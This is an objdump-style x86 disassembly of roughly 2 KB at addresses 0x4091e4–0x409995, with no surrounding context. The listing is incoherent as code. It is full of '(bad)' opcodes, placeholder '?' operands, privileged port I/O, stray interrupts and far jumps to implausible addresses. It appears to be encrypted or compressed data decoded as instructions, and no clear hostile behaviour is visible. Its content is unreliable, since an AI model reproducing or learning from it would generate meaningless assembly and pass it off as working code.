  4091e4:	xor    BYTE PTR [ecx-0x29db56],al
  4091ea:	repz lock cmp eax,0x50a11657
  4091f1:	lock cdq 
  4091f3:	jne    0x4091bf
  4091f5:	push   ebp
  4091f6:	mov    DWORD PTR ds:0xaf99bdd5,edi
  4091fc:	cmc    
  4091fd:	sbb    ecx,DWORD PTR [eax+esi*4+0x6da102de]
  409204:	xor    ebx,ebp
  409206:	stos   DWORD PTR es:[edi],eax
  409207:	pop    ecx
  409208:	dec    ebx
  409209:	fwait
  40920a:	and    BYTE PTR [ecx-0x67728eb6],ch
  409210:	xchg   edi,eax
  409211:	test   al,0x5
  409213:	sti    
  409214:	push   eax
  409215:	mov    ch,BYTE PTR [edi]
  409217:	inc    ebx
  409218:	rol    BYTE PTR [esi],cl
  40921a:	sti    
  40921b:	pop    esi
  40921c:	mov    ch,0xd
  40921e:	mov    bl,0x47
  409220:	adc    DWORD PTR [edi+0x22c9b7e4],esp
  409226:	or     al,0x36
  409228:	scas   al,BYTE PTR es:[edi]
  409229:	(bad)  
  40922a:	jne    0x409267
  40922c:	mov    bl,0x2a
  40922e:	cmp    bl,BYTE PTR [edi+ecx*4+0x6fe346d6]
  409235:	push   esi
  409236:	pop    ecx
  409237:	jne    0x409267
  409239:	push   eax
  40923a:	push   edx
  40923b:	push   esp
  40923c:	sbb    al,0x79
  40923e:	daa    
  40923f:	sub    eax,0xae52c95a
  409244:	mov    edi,0xd975e3b0
  409249:	xchg   ebx,eax
  40924a:	loopne 0x4092bb
  40924c:	add    WORD PTR [ebp+0x5742ba28],ax
  409253:	das    
  409254:	retf   
  409255:	std    
  409256:	inc    eax
  409257:	push   ebp
  409258:	cs sti 
  40925a:	call   0xb38b:0x60821a97
  409261:	arpl   WORD PTR [eax+0x7b604205],di
  409267:	and    bl,ah
  409269:	xchg   ebx,ecx
  40926b:	sbb    al,0x8d
  40926d:	cmp    al,0xfc
  40926f:	fs or  al,0xdc
  409272:	cmp    edx,edi
  409274:	pop    esp
  409275:	sub    BYTE PTR [ecx],0xff
  409278:	pushf  
  409279:	repnz xchg esi,eax
  40927b:	pop    esi
  40927c:	adc    eax,0xcdf3e063
  409281:	add    ch,0xe1
  409284:	rcr    DWORD PTR [ebp+0x42],0xd7
  409288:	sbb    edi,ebp
  40928a:	jae    0x409210
  40928c:	fsub   QWORD PTR [eax]
  40928e:	jl     0x409217
  409290:	cmp    al,0x8e
  409292:	aas    
  409293:	imul   edi,DWORD PTR [edi+eax*4-0x53],0x8
  409298:	(bad)  
  409299:	jmp    0x409248
  40929b:	mov    dh,0xab
  40929d:	sub    ebp,DWORD PTR [esi+0x4aaf8b9]
  4092a3:	xchg   esp,eax
  4092a4:	xchg   edx,eax
  4092a5:	je     0x40924b
  4092a7:	aaa    
  4092a8:	loop   0x40923d
  4092aa:	push   ebp
  4092ab:	push   ds
  4092ac:	out    dx,eax
  4092ad:	pop    es
  4092ae:	xchg   ebp,eax
  4092af:	jle    0x409288
  4092b1:	outs   dx,DWORD PTR ds:[esi]
  4092b2:	int    0xd9
  4092b4:	cs pop es
  4092b6:	push   ss
  4092b7:	nop
  4092b8:	(bad)  
  4092b9:	les    ebp,FWORD PTR [edx]
  4092bb:	sar    edi,1
  4092bd:	punpcklwd mm4,DWORD PTR [ecx]
  4092c0:	mov    esi,0x50c92a2b
  4092c5:	ins    BYTE PTR es:[edi],dx
  4092c6:	mov    esi,0x78d9dc0f
  4092cb:	jg     0x409315
  4092cd:	cmp    al,0xe5
  4092cf:	out    0x3b,eax
  4092d1:	mov    WORD PTR [ecx],es
  4092d3:	jns    0x409279
  4092d5:	mov    bh,0x88
  4092d7:	stos   BYTE PTR es:[edi],al
  4092d8:	std    
  4092d9:	cs push ss
  4092db:	int    0x94
  4092dd:	jg     0x40934d
  4092df:	arpl   WORD PTR [edx-0x72],si
  4092e2:	les    esp,FWORD PTR ds:0x1fdaf959
  4092e8:	sub    DWORD PTR [esi+0x7f730239],ebx
  4092ee:	stos   DWORD PTR es:[edi],eax
  4092ef:	loopne 0x4092b0
  4092f1:	jne    0x40933d
  4092f3:	mov    esp,0xf9a22da4
  4092f8:	in     eax,0xe7
  4092fa:	dec    eax
  4092fb:	jae    0x409375
  4092fd:	or     al,0xf2
  4092ff:	int3   
  409300:	inc    ebx
  409301:	sub    BYTE PTR [edx],cl
  409303:	xchg   ecx,eax
  409304:	push   edx
  409305:	das    
  409306:	sub    bl,BYTE PTR [ebp+0x104d00d5]
  40930c:	das    
  40930d:	iret   
  40930e:	ss dec ebx
  409310:	repnz push edi
  409312:	push   ds
  409313:	enter  0x143f,0xed
  409317:	dec    edi
  409318:	push   eax
  409319:	sbb    eax,0x58cd7cac
  40931e:	and    DWORD PTR [edi+0xb],ebx
  409321:	add    edi,ebp
  409323:	or     ch,bl
  409325:	fistp  DWORD PTR [ecx]
  409327:	cld    
  409328:	int    0x73
  40932a:	repz and al,0x15
  40932d:	mov    ecx,0x130ca8cd
  409332:	push   edx
  409333:	mov    ds:0xe5ad9ef1,eax
  409338:	bound  esp,QWORD PTR [edi]
  40933a:	jae    0x409354
  40933c:	dec    eax
  40933d:	pop    esi
  40933e:	inc    esi
  40933f:	stc    
  409340:	ins    DWORD PTR es:[edi],dx
  409341:	inc    BYTE PTR [edx+0x58]
  409344:	xchg   ecx,eax
  409345:	js     0x40933d
  409347:	inc    ecx
  409348:	rol    BYTE PTR [edi+0x54692e7b],1
  40934e:	xor    al,0xb2
  409350:	mov    al,BYTE PTR [ebx+0x57]
  409353:	jp     0x409340
  409355:	push   es
  409356:	pop    ds
  409357:	pop    edx
  409358:	xor    eax,DWORD PTR [ecx+0x3534201a]
  40935e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  409360:	test   al,0x42
  409362:	pop    es
  409363:	adc    al,0x5
  409365:	stc    
  409366:	sub    DWORD PTR [ecx+0x63],0x1f
  40936a:	leavew 
  40936c:	and    cl,BYTE PTR ds:0x7581a1a2
  409372:	retf   0x520d
  409375:	repz out dx,eax
  409377:	inc    esp
  409378:	mov    ch,0x62
  40937a:	and    DWORD PTR [esi],esi
  40937c:	inc    ebp
  40937d:	in     al,dx
  40937e:	sbb    esi,ebp
  409380:	mov    esi,0x4f55a07e
  409385:	inc    eax
  409386:	data16 ficomp WORD PTR [ecx]
  409389:	lea    eax,ds:0xeb85b254
  40938f:	dec    esi
  409390:	rcr    DWORD PTR [eax-0x1f2950a2],cl
  409396:	xchg   DWORD PTR ds:[edi-0x65],esp
  40939a:	(bad)  
  40939b:	xchg   esp,eax
  40939c:	je     0x1e50dddd
  4093a2:	cmp    ebx,DWORD PTR [ebx-0x70fd7f7e]
  4093a8:	jmp    0x40940d
  4093aa:	out    dx,al
  4093ab:	mov    ebx,0x4ac0b026
  4093b0:	(bad)  
  4093b1:	xchg   ecx,eax
  4093b2:	out    0x6d,eax
  4093b4:	mov    ah,0xdc
  4093b6:	ja     0x40940b
  4093b8:	push   eax
  4093b9:	mov    bl,0x82
  4093bb:	jo     0x4093df
  4093bd:	stc    
  4093be:	and    dl,BYTE PTR gs:[eax]
  4093c1:	mov    ebx,0xc68f87a6
  4093c6:	fnop   
  4093c8:	dec    eax
  4093c9:	sahf   
  4093ca:	into   
  4093cb:	push   es
  4093cc:	imul   esp,DWORD PTR [ebp-0x549933bf],0xffffffb3
  4093d3:	inc    ebp
  4093d4:	mov    edx,0xdf851add
  4093d9:	sub    DWORD PTR [edi],ecx
  4093db:	in     eax,0x11
  4093dd:	sahf   
  4093de:	inc    ebp
  4093df:	(bad)  
  4093e0:	pop    ss
  4093e1:	fwait
  4093e2:	pop    ebp
  4093e3:	mov    esp,0x3d54de39
  4093e8:	aas    
  4093e9:	and    eax,0x73cbc49d
  4093ee:	jg     0x4093e8
  4093f0:	and    DWORD PTR [ebp+0x185962cb],0xfffffffa
  4093f7:	push   ebp
  4093f8:	push   0xcff8177
  4093fd:	ret    
  4093fe:	loopne 0x4093c7
  409400:	aas    
  409401:	and    eax,0xacdde3a8
  409406:	aam    0xdd
  409408:	retf   
  409409:	jne    0x409471
  40940b:	inc    ebp
  40940c:	adc    BYTE PTR [ebp+0x7f],bl
  40940f:	cs xchg esp,eax
  409411:	je     0x40941b
  409413:	rcl    BYTE PTR [edi+0x37],1
  409416:	push   esi
  409417:	int3   
  409418:	into   
  409419:	xor    DWORD PTR [edx],ebx
  40941b:	dec    edx
  40941c:	stc    
  40941d:	inc    esi
  40941e:	ret    0x40f7
  409421:	dec    esi
  409422:	jp     0x40949d
  409424:	test   cl,bl
  409426:	sbb    eax,0x7963f34d
  40942b:	loopne 0x409454
  40942d:	sub    esp,DWORD PTR [ecx]
  40942f:	pop    edi
  409430:	aam    0x56
  409432:	jnp    0x4093fe
  409434:	fs cmp eax,0x3b8fb890
  40943a:	cmp    bh,ch
  40943c:	pop    edx
  40943d:	into   
  40943e:	jmp    0x1d0a25f0
  409443:	popf   
  409444:	bound  ebp,QWORD PTR [edi]
  409446:	cld    
  409447:	dec    ebx
  409448:	shl    DWORD PTR [ecx],1
  40944a:	(bad)  
  40944b:	neg    BYTE PTR [eax-0x4bc88b82]
  409451:	stc    
  409452:	dec    ebx
  409453:	or     cl,BYTE PTR [ecx]
  409455:	jle    0x4094a3
  409457:	mov    esi,0xfb11f644
  40945c:	mov    ch,0x4f
  40945e:	dec    ecx
  40945f:	sbb    DWORD PTR [esi+0x6f6eed99],esp
  409465:	cmp    bh,bh
  409467:	std    
  409468:	dec    edi
  409469:	inc    ebx
  40946a:	mov    edi,0x21542108
  40946f:	mov    ds,WORD PTR [esi-0x53]
  409472:	xor    dl,bh
  409474:	add    ebx,DWORD PTR [ebx+0x4ea62fec]
  40947a:	jecxz  0x409478
  40947c:	or     BYTE PTR [ebp+0x17],ch
  40947f:	adc    al,0x74
  409481:	fcom   QWORD PTR [ecx]
  409483:	push   edx
  409484:	arpl   WORD PTR ss:[ecx+0x2e915285],cx
  40948b:	cmc    
  40948c:	stos   DWORD PTR es:[edi],eax
  40948d:	popf   
  40948e:	enter  0xafd3,0x97
  409492:	xor    cl,cl
  409494:	fwait
  409495:	out    dx,eax
  409496:	mov    gs,WORD PTR [edi+0x5c8af869]
  40949c:	mov    DWORD PTR [ebx-0xc],ebx
  40949f:	pop    esp
  4094a0:	sbb    al,0x1d
  4094a2:	mul    dl
  4094a4:	mov    ebp,esp
  4094a6:	nop    edx
  4094a9:	jg     0x409469
  4094ab:	aaa    
  4094ac:	dec    ecx
  4094ad:	scas   eax,DWORD PTR es:[edi]
  4094ae:	mov    ecx,0xd08aec91
  4094b3:	retf   
  4094b4:	aaa    
  4094b5:	mov    WORD PTR [edi],?
  4094b7:	into   
  4094b8:	jb     0x4094b3
  4094ba:	popa   
  4094bb:	or     dh,dl
  4094bd:	xchg   ebp,eax
  4094be:	xor    eax,DWORD PTR gs:[ebx-0x74]
  4094c2:	add    dh,dl
  4094c4:	lds    ebx,FWORD PTR ds:0xbcc8b17b
  4094ca:	mov    esi,0x543ddb92
  4094cf:	ja     0x409463
  4094d1:	pusha  
  4094d2:	xlat   BYTE PTR ds:[ebx]
  4094d3:	das    
  4094d4:	jne    0x40953a
  4094d6:	add    al,BYTE PTR [eax]
  4094d8:	xchg   BYTE PTR [esi+0x42],bh
  4094db:	mov    cl,BYTE PTR [esi+0x5]
  4094de:	jmp    0xe16ceaed
  4094e3:	pop    ecx
  4094e4:	ja     0x4094d0
  4094e6:	mov    cl,BYTE PTR [ebx-0x7bdaf8f7]
  4094ec:	imul   BYTE PTR [ebp+0x23e0d387]
  4094f2:	mov    bh,0x56
  4094f4:	bound  esp,QWORD PTR [ebp+0x43]
  4094f7:	add    al,0xb5
  4094f9:	mov    ch,BYTE PTR [ebx-0x61866dc2]
  4094ff:	cdq    
  409500:	ficom  DWORD PTR [ebp+eax*2-0x28]
  409504:	mov    ah,0x3
  409506:	push   eax
  409507:	cmp    DWORD PTR [ebx-0x23867c7d],edx
  40950d:	inc    edx
  40950e:	into   
  40950f:	push   eax
  409510:	and    eax,0xb4f8c157
  409515:	pop    esp
  409516:	adc    al,0x1
  409518:	add    eax,0x82f8305c
  40951d:	ds lahf 
  40951f:	push   ss
  409520:	lods   eax,DWORD PTR ds:[esi]
  409521:	mov    WORD PTR [edi+0x47],fs
  409524:	stos   DWORD PTR es:[edi],eax
  409525:	test   BYTE PTR [esi],dl
  409527:	ins    DWORD PTR es:[edi],dx
  409528:	imul   edi,DWORD PTR [eax-0x70e2203f],0xc5af0961
  409532:	retf   
  409533:	sbb    edi,DWORD PTR [ebx+0x13]
  409536:	or     al,BYTE PTR [edx]
  409538:	je     0x3ef41412
  40953e:	jb     0x4094e3
  409540:	sbb    bh,BYTE PTR [edi+0x2b]
  409543:	loop   0x40956c
  409545:	jb     0x4094d4
  409547:	mov    edx,0x60ff5300
  40954c:	dec    edx
  40954d:	test   al,0x27
  40954f:	and    BYTE PTR [esi],dh
  409551:	ficomp WORD PTR [eax]
  409553:	cdq    
  409554:	cmp    esi,ecx
  409556:	stos   DWORD PTR es:[edi],eax
  409557:	jmp    FWORD PTR [eax-0x7f353963]
  40955d:	fcomp  st(4)
  40955f:	je     0x4095d9
  409561:	ffreep st(7)
  409563:	in     eax,0x24
  409565:	dec    edx
  409566:	push   ecx
  409567:	jge    0x40951d
  409569:	into   
  40956a:	ret    0xfda0
  40956d:	das    
  40956e:	hlt    
  40956f:	adc    BYTE PTR [edi+0x63ea5b10],0xfb
  409576:	mul    DWORD PTR [eax]
  409578:	jmp    0xaf68c3c2
  40957d:	sbb    DWORD PTR ds:0x801f0051,eax
  409583:	mov    dl,0xe6
  409585:	mov    bl,0x79
  409587:	pop    eax
  409588:	loopne 0x4095b7
  40958a:	push   ds
  40958b:	jl     0x40955e
  40958d:	scas   eax,DWORD PTR es:[edi]
  40958e:	jb     0x40958b
  409590:	shl    DWORD PTR [edi+ecx*2+0x17],1
  409594:	pop    ecx
  409595:	imul   esi,DWORD PTR [ebp+0x48e3b0c5],0x5b679a60
  40959f:	push   ecx
  4095a0:	shl    DWORD PTR [eax+0x1e],1
  4095a3:	xchg   esp,eax
  4095a4:	cmp    BYTE PTR [ebx-0x61],0xc1
  4095a8:	lods   al,BYTE PTR ds:[esi]
  4095a9:	sbb    DWORD PTR [esi-0x66],eax
  4095ac:	jp     0x4095c0
  4095ae:	popa   
  4095af:	sar    DWORD PTR ds:0x78359f12,1
  4095b5:	dec    esp
  4095b6:	cs hlt 
  4095b8:	iret   
  4095b9:	jne    0x409603
  4095bb:	xchg   ecx,eax
  4095bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095bd:	sub    eax,0xe49fd231
  4095c2:	aaa    
  4095c3:	pushf  
  4095c4:	or     al,0x66
  4095c6:	pop    ebx
  4095c7:	xor    BYTE PTR [ebx+eax*8-0x6b3f13de],0xaf
  4095cf:	xor    al,BYTE PTR [eax]
  4095d1:	adc    ebp,esp
  4095d3:	mov    ds:0x75b16a37,al
  4095d8:	dec    eax
  4095d9:	push   ebp
  4095da:	pop    eax
  4095db:	jb     0x4095b3
  4095dd:	dec    esi
  4095de:	mov    al,0xf7
  4095e0:	loop   0x40962b
  4095e2:	hlt    
  4095e3:	push   ebp
  4095e4:	jg     0x409624
  4095e6:	dec    ebp
  4095e7:	cmp    cl,BYTE PTR [ecx]
  4095e9:	in     al,dx
  4095ea:	xchg   BYTE PTR [edx],bh
  4095ec:	clc    
  4095ed:	add    dh,0x61
  4095f0:	pop    esi
  4095f1:	pop    edi
  4095f2:	cmp    dl,cl
  4095f4:	jecxz  0x409579
  4095f6:	repz cwde 
  4095f8:	cli    
  4095f9:	inc    DWORD PTR [edx]
  4095fb:	sub    al,ch
  4095fd:	cmc    
  4095fe:	adc    bh,0x27
  409601:	lahf   
  409602:	add    al,0x13
  409604:	pushf  
  409605:	add    edi,DWORD PTR [ebp+esi*8+0x23]
  409609:	sbb    bh,ch
  40960b:	cmp    bl,BYTE PTR [esi]
  40960d:	stos   DWORD PTR es:[edi],eax
  40960e:	fucomp st(6)
  409610:	pop    ecx
  409611:	mov    cl,0xb
  409613:	je     0x40967b
  409615:	or     ecx,ebx
  409617:	xchg   edx,eax
  409618:	cmp    DWORD PTR [esi-0x2a0915f8],ebx
  40961e:	xor    al,0xb5
  409620:	xchg   DWORD PTR [ebp-0x77],edx
  409623:	mul    BYTE PTR cs:[ecx]
  409626:	test   BYTE PTR [ebp-0x70],al
  409629:	jge    0x409693
  40962b:	lahf   
  40962c:	pop    ebx
  40962d:	xor    edi,DWORD PTR [esi]
  40962f:	mov    dl,0xf6
  409631:	cmp    eax,0x76cb1ea
  409636:	mov    gs,WORD PTR [eax+ebp*8-0x72]
  40963a:	adc    DWORD PTR [edi+0x21],ebx
  40963d:	call   0x7ea7edd6
  409642:	add    edi,DWORD PTR [edi-0x38]
  409645:	scas   al,BYTE PTR es:[edi]
  409646:	test   eax,0xac16f75c
  40964b:	fadd   QWORD PTR ds:[ecx]
  40964e:	aas    
  40964f:	mov    al,0x55
  409651:	shr    DWORD PTR [esi+0x36ad9b98],1
  409657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409658:	pusha  
  409659:	and    BYTE PTR [edi-0x7cf55321],0xb7
  409660:	jl     0x4096c5
  409662:	mov    eax,ds:0x134135c
  409667:	lods   al,BYTE PTR ds:[esi]
  409668:	aam    0x97
  40966a:	frstor [edi-0x34]
  40966d:	mov    bl,0xb3
  40966f:	adc    al,0x6c
  409671:	xchg   ebx,eax
  409672:	sbb    esp,DWORD PTR [ebx]
  409674:	retf   
  409675:	fidivr WORD PTR [ebp+0x6e8cc55]
  40967b:	loop   0x40969e
  40967d:	lahf   
  40967e:	jns    0x4096c8
  409680:	mov    cl,0x56
  409682:	mov    ds:0x29666b70,al
  409687:	fdiv   st,st(3)
  409689:	mov    esp,0x3b2aeeaf
  40968e:	xchg   esp,eax
  40968f:	sbb    BYTE PTR [edx+eax*2+0x12e08cee],cl
  409696:	dec    edx
  409697:	lods   eax,DWORD PTR ds:[esi]
  409698:	dec    esi
  409699:	mov    ecx,DWORD PTR [edi-0x1905ba07]
  40969f:	push   ebx
  4096a0:	or     ch,BYTE PTR [eax+0x4d]
  4096a3:	ficomp DWORD PTR [ecx+0x60]
  4096a6:	int    0xfa
  4096a8:	xlat   BYTE PTR ds:[ebx]
  4096a9:	daa    
  4096aa:	and    BYTE PTR [esi+0x4b],ah
  4096ad:	add    cl,BYTE PTR [esp+esi*4+0x2e]
  4096b1:	sub    eax,0x6cc0589e
  4096b6:	jmp    0xa306cd73
  4096bb:	mov    ?,WORD PTR [ecx]
  4096bd:	mov    bh,0x6c
  4096bf:	popa   
  4096c0:	mov    cl,ah
  4096c2:	clc    
  4096c3:	lock inc ebx
  4096c5:	pop    eax
  4096c6:	outs   dx,DWORD PTR ds:[esi]
  4096c7:	cwde   
  4096c8:	test   al,0x6d
  4096ca:	nop
  4096cb:	add    al,0x23
  4096cd:	stos   BYTE PTR es:[edi],al
  4096ce:	push   ecx
  4096cf:	xchg   ebx,eax
  4096d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096d1:	(bad)  
  4096d3:	ror    BYTE PTR [esi-0x47],cl
  4096d6:	sub    DWORD PTR [bx],0x5d
  4096da:	dec    al
  4096dc:	xor    eax,0xe2527e0f
  4096e1:	cmp    DWORD PTR [edx-0xf],ebx
  4096e4:	cs int3 
  4096e6:	push   eax
  4096e7:	std    
  4096e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096ea:	out    0x4f,eax
  4096ec:	scas   eax,DWORD PTR es:[edi]
  4096ed:	cmp    BYTE PTR [ebx-0x58b48a8c],0x44
  4096f4:	pop    ebx
  4096f5:	push   esp
  4096f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096f7:	sbb    al,0xc9
  4096f9:	jmp    0x409685
  4096fb:	xor    BYTE PTR cs:[ebx],ah
  4096fe:	cld    
  4096ff:	inc    ebx
  409700:	fucomi st,st(4)
  409702:	xchg   edi,eax
  409703:	add    DWORD PTR [ebx],0xffffffa6
  409706:	cmp    BYTE PTR [eax+0x5f3a34ae],cl
  40970c:	std    
  40970d:	imul   esi,DWORD PTR [ecx],0x5b92386f
  409713:	pop    ebx
  409714:	dec    ebp
  409715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409716:	test   edx,ebp
  409718:	rol    esp,cl
  40971a:	xchg   ebx,eax
  40971b:	ja     0x409743
  40971d:	xchg   ebp,eax
  40971f:	and    bh,BYTE PTR [edx-0x88db0b9]
  409725:	std    
  409726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409727:	repnz inc esp
  409729:	pop    ss
  40972a:	shr    DWORD PTR ds:0xbd8283ec,1
  409730:	dec    esp
  409731:	int3   
  409732:	sbb    bl,BYTE PTR [esi]
  409734:	adc    esi,0x475e57ad
  40973a:	dec    DWORD PTR [edx-0x56]
  40973d:	push   ebx
  40973e:	mov    eax,ds:0x2f3b6c6f
  409743:	push   ds
  409744:	dec    ebx
  409745:	into   
  409746:	and    BYTE PTR [edi-0x4b76e95c],bh
  40974c:	jo     0x4097b9
  40974e:	sahf   
  40974f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409750:	ja     0x4097bb
  409752:	xlat   BYTE PTR ds:[ebx]
  409753:	neg    DWORD PTR [ecx+0x448e344]
  409759:	sub    DWORD PTR [ecx],ebp
  40975b:	(bad)  
  40975c:	scas   eax,DWORD PTR es:[edi]
  40975d:	push   ecx
  40975e:	mov    dl,0x61
  409760:	add    edx,DWORD PTR [ebp+0x17]
  409763:	or     eax,0x14e9e039
  409769:	retf   
  40976a:	sar    BYTE PTR [ebx+0x2f6bd556],0x32
  409771:	imul   ecx,edi,0xffffffd8
  409774:	xor    al,0x19
  409776:	repnz mov dh,BYTE PTR [eax]
  409779:	(bad)  
  40977b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40977c:	sub    eax,0xa21a4e4c
  409781:	in     eax,dx
  409782:	das    
  409783:	mov    bh,0xc6
  409785:	cmp    eax,0x619b529f
  40978a:	imul   ebx,DWORD PTR [edi+0x34],0x54a10e42
  409791:	std    
  409792:	and    DWORD PTR [eax],edi
  409794:	ja     0x4097b4
  409796:	xor    BYTE PTR [ebx+esi*1+0x2f],bl
  40979a:	mov    ds:0xbf862df2,eax
  40979f:	out    0xea,eax
  4097a1:	and    esp,DWORD PTR [ebx-0x1a]
  4097a4:	mov    edx,0xc8c34df1
  4097a9:	jns    0x40976b
  4097ab:	xchg   BYTE PTR [ebx],dl
  4097ad:	cld    
  4097ae:	push   0xffffff96
  4097b0:	nop
  4097b1:	jne    0x40980c
  4097b3:	fnstcw WORD PTR [ebx+edi*8-0x449ed484]
  4097ba:	mov    dl,0x29
  4097bc:	fucomp st(7)
  4097be:	sub    dl,bl
  4097c0:	jg     0x40974c
  4097c2:	idiv   BYTE PTR [ebx+0x407bd640]
  4097c8:	push   ebx
  4097c9:	cmp    ecx,DWORD PTR [ebp+0x1f]
  4097cc:	stos   DWORD PTR es:[edi],eax
  4097cd:	adc    eax,0xc3590459
  4097d2:	lods   al,BYTE PTR ds:[esi]
  4097d3:	(bad)  
  4097d4:	idiv   BYTE PTR [eax+0x38422e01]
  4097da:	adc    DWORD PTR [edi-0x580d10d3],eax
  4097e0:	shr    BYTE PTR [ebp+0x1d],1
  4097e3:	xchg   ebp,eax
  4097e4:	jns    0x4097a5
  4097e6:	push   0x27
  4097e8:	dec    esp
  4097e9:	mov    bh,0xa3
  4097eb:	fld    TBYTE PTR [edx-0x23688a0b]
  4097f1:	lock or eax,0x3259055e
  4097f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097f8:	out    0x11,eax
  4097fa:	ficomp DWORD PTR [edi]
  4097fc:	loope  0x4097a1
  4097fe:	pop    eax
  4097ff:	push   cs
  409800:	and    esp,DWORD PTR [edi+0x56420cbe]
  409806:	aad    0xde
  409808:	push   0xffffffc9
  40980a:	(bad)  
  40980b:	loop   0x4097ad
  40980d:	pop    ecx
  40980e:	mov    DWORD PTR ds:0x1cdddb10,0x30505940
  409818:	data16 cmp BYTE PTR [edi-0x30],al
  40981c:	js     0x409811
  40981e:	adc    eax,0xc387b7da
  409823:	shl    DWORD PTR [eax+ebp*2+0x39e48ca0],0x26
  40982b:	sbb    DWORD PTR [ebx],ebx
  40982d:	mov    al,ds:0x697f53dd
  409832:	aam    0x95
  409834:	aaa    
  409835:	call   0x99e:0x32089ebc
  40983c:	in     al,0xe0
  40983e:	xchg   esp,eax
  40983f:	mov    al,0x80
  409841:	lock sbb esp,ebp
  409844:	sbb    dl,cl
  409846:	jle    0x409831
  409848:	and    BYTE PTR [edi+0x33537afc],ch
  40984e:	cdq    
  40984f:	mov    dl,0x90
  409851:	dec    eax
  409852:	mov    ah,0x68
  409854:	xor    BYTE PTR [ebx],0xb1
  409857:	retf   
  409858:	mov    edi,0x673ba9f0
  40985d:	mov    esi,0x36de1a39
  409862:	cmp    eax,0x88e4d67e
  409867:	inc    eax
  409868:	test   al,0x29
  40986a:	jp     0x409899
  40986c:	inc    edi
  40986d:	ins    DWORD PTR es:[edi],dx
  40986e:	ins    DWORD PTR es:[edi],dx
  40986f:	mov    cl,0xc9
  409871:	popf   
  409872:	lds    ebp,FWORD PTR [ebx-0x3a9834e6]
  409878:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409879:	and    ecx,DWORD PTR [edi-0x13]
  40987c:	sti    
  40987d:	mov    bh,BYTE PTR [edx]
  40987f:	out    0x17,al
  409881:	iret   
  409882:	loopne 0x40983e
  409884:	cmp    BYTE PTR gs:[bx+0xfeb],al
  40988a:	jb     0x4098a9
  40988c:	inc    esi
  40988d:	mov    esp,ss
  40988f:	mov    ds:0xf01928d4,al
  409894:	inc    ecx
  409895:	mov    DWORD PTR [eax+0x73fb4785],ebx
  40989b:	and    esi,DWORD PTR [ebx]
  40989d:	pop    ss
  40989e:	or     ah,ch
  4098a0:	shl    BYTE PTR [eax+0x2e],0x22
  4098a4:	xor    ah,ch
  4098a6:	outs   dx,BYTE PTR ds:[esi]
  4098a7:	dec    edi
  4098a8:	mov    esp,0x7886082
  4098ad:	pop    es
  4098ae:	dec    ebx
  4098af:	mov    dl,0x4c
  4098b1:	(bad)  
  4098b2:	add    edx,DWORD PTR [edi+0x1ae6e403]
  4098b8:	and    DWORD PTR [ecx*4+0x255837d8],0x47ea9539
  4098c3:	mov    bl,BYTE PTR [edx+eiz*4+0xe]
  4098c7:	js     0xbe3a9cd8
  4098cd:	fimul  WORD PTR [ecx]
  4098cf:	inc    ebp
  4098d0:	mov    ah,dh
  4098d2:	adc    ch,BYTE PTR ds:0xabc7971
  4098d8:	adc    eax,DWORD PTR [edx-0x5cd3790a]
  4098de:	loopne 0x409865
  4098e0:	xor    al,0xef
  4098e2:	dec    ebx
  4098e3:	push   ebp
  4098e4:	daa    
  4098e5:	mov    DWORD PTR [eax],ebx
  4098e7:	add    al,0x48
  4098e9:	push   ss
  4098ea:	and    bl,bl
  4098ec:	xchg   esp,eax
  4098ed:	jecxz  0x40987e
  4098ef:	in     eax,dx
  4098f0:	or     ebp,DWORD PTR [ecx-0x15]
  4098f3:	push   0x13
  4098f5:	sub    ah,bl
  4098f7:	out    0x6f,eax
  4098f9:	stc    
  4098fa:	sbb    ah,BYTE PTR [ecx-0x76]
  4098fd:	or     DWORD PTR [edi+0x42],0x861d945b
  409904:	jle    0x4098ef
  409906:	aam    0xb0
  409908:	sub    DWORD PTR [ecx+ecx*2-0x48],edi
  40990c:	xor    BYTE PTR [edx+0xa5d3283],0xe3
  409913:	pop    es
  409914:	repnz xchg edx,eax
  409916:	pusha  
  409917:	lahf   
  409918:	sub    ecx,edx
  40991a:	add    eax,0xdb083474
  40991f:	adc    BYTE PTR cs:[edi+esi*2],bl
  409923:	test   DWORD PTR [eax-0x6a],0xaee64771
  40992a:	loop   0x4098c4
  40992c:	pushf  
  40992d:	(bad)  
  40992e:	jno    0x40994e
  409930:	cmp    al,0xfc
  409932:	call   0xafde:0xaa45acad
  409939:	dec    edi
  40993a:	dec    ecx
  40993b:	gs mov cl,0xd8
  40993e:	jnp    0x4099b2
  409940:	xchg   ebx,eax
  409941:	pop    ebp
  409942:	outs   dx,BYTE PTR ds:[esi]
  409943:	fdiv   DWORD PTR ss:[eax-0x43613c]
  40994a:	mov    dh,0x11
  40994c:	mov    edi,0xc215dee7
  409951:	pop    esp
  409952:	mov    ah,0x42
  409954:	push   edx
  409955:	pop    ebp
  409956:	fadd   QWORD PTR [ecx]
  409958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409959:	repz dec ecx
  40995b:	pop    edi
  40995c:	mov    al,0xed
  40995e:	imul   esp,esi,0xffffffa9
  409961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409962:	dec    esp
  409963:	sbb    al,0x74
  409965:	mov    ch,0xe4
  409967:	jnp    0xec769e69
  40996d:	hlt    
  40996e:	xor    eax,0xb221f25c
  409973:	mov    ebp,edi
  409975:	sub    bl,BYTE PTR [ecx-0x3ad635cd]
  40997b:	add    BYTE PTR gs:[edi+esi*8-0x23],dh
  409980:	pop    eax
  409981:	mov    ch,0x39
  409983:	add    al,0x4
  409985:	dec    esi
  409986:	out    0x54,eax
  409988:	ret    0x74bc
  40998b:	add    BYTE PTR [ebp-0x1a],dl
  40998e:	mov    ecx,0x22cb17cd
  409993:	sbb    DWORD PTR [eax],esp
  409995:	test   al,0xac
